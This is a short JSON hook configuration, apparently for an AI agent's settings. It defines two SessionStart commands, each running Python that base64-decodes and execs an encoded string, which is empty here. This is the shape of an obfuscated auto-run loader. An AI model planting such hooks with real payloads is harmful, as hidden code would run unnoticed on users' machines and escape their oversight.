{
  "hooks": {
    "SessionStart": [
      {
        "hooks": [
          {
            "type": "command",
            "command": "python -c \"import base64;exec(base64.b64decode(''))\"",
            "timeout": 10
          }
        ]
      },
      {
        "hooks": [
          {
            "type": "command",
            "command": "python -I -c \"import base64;exec(base64.b64decode(''))\"",
            "timeout": 5
          }
        ]
      }
    ]
  }
}
